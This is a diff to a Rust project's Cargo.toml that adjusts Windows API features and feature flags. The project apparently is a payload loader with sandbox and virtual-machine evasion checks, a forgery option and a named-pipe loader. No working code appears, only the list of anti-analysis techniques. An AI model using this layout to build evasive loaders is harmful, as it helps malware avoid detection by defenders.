@@ -9,7 +9,7 @@ edition = "2021"
 tempfile = "3.10.1"
 base64 = "0.21.5"
 base32 = "0.5.1"
-windows-sys = { version = "0.42.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader", "Win32_System_Pipes", "Win32_Storage_FileSystem"] }
+windows-sys = { version = "0.42.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader", "Win32_System_Pipes", "Win32_Storage_FileSystem", "Win32_System_SystemInformation"] }
 windows = { version = "0.51.1", features = ["Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader"] }
 winreg = "0.52.0"
 uuid = { version = "1.0", features = ["v4"] }
@@ -118,14 +118,17 @@ with_forgery = []               # 启用伪造特性
 sandbox = []
 vm_check_c_drive = ["sandbox"]
 vm_check_desktop_files = ["sandbox"]
+vm_check_prime = ["sandbox"]
 vm_check_tick = ["sandbox"]
 vm_check_api_flood = ["sandbox"]
-vm_check_peek = ["sandbox"]
 vm_check_mouse = ["sandbox"]
 vm_check_uptime = ["sandbox"]
 vm_check_usb_mount = ["sandbox"]
 vm_check_cpu_info = ["sandbox"]
 vm_check_rdtsc_timing = ["sandbox"]
+vm_check_edge = ["sandbox"]
+vm_check_time = ["sandbox"]
+vm_check_ip = ["sandbox"]
 
 named_pipe_loader = []
 
